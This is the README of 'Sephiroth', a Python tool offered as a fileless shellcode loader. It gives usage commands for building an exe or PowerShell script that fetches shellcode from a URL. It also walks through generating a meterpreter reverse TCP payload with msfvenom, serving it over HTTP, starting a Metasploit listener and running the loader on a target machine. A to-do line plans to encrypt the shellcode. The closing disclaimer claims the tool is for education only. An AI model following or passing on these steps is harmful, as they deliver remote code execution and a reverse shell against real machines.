![Alt text](<2024-02-20 07_45_57-C__Windows_System32_cmd.exe.png>)

Greetings
-------------------

sephiroth  is a Fileless Shellcode Loader with Python :


Usage: python Sephiros.py -url 'urlforshellcode'

u can generate a ps1 script with -ps instead of building into exe

python Sephiros.py -url 'urlforshellcode' -ps

you can also just embed shellcode into the PE directly using -sh 'pathofshellcode'


python Sephiros.py -sh 'pathto_shellcode'

setup
---------

pip install -r requirements.txt

python Sephiroth.py

fileless execution example:
-------------------
generate shellcode with:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=0.0.0.0 LPORT=5555 -f raw  -o shellcode

python3 -m http.server 80


then:

python Sephiroth.py -url http://yourip/shellcode

start metasploit listener

execute PE on target machine

todo
--------
asymetric encryption to the shellcode

DISCLAIMER :
----------------------
ME The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. ME The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of Sephiros. By using Sephiros or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again Sephiros is for EDUCATION and/or RESEARCH purposes ONLY